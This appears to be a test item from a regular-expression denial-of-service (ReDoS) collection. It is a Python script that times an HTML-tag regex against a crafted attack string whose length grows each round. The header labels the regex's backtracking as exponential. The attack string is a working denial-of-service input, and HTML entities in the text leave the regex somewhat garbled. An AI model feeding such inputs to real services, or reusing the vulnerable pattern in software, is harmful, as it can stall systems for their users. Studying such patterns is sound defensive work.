# 120
# &lt;/?(\w+)(\s*\w*\s*=\s*(&quot;[^&quot;]*&quot;|'[^']'|[^&gt;]*))*|/?&gt;
# EXPONENT
# nums:4
# EXPONENT AttackString:"&lt;1"+"\t=&quot;&quot;"*32+"! _1_EOA(i or ii)"

import re
from time import perf_counter

regex = """&lt;/?(\w+)(\s*\w*\s*=\s*(&quot;[^&quot;]*&quot;|'[^']'|[^&gt;]*))*|/?&gt;"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "&lt;1" + "\t=&quot;&quot;" * i * 1 + "! _1_EOA(i or ii)"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")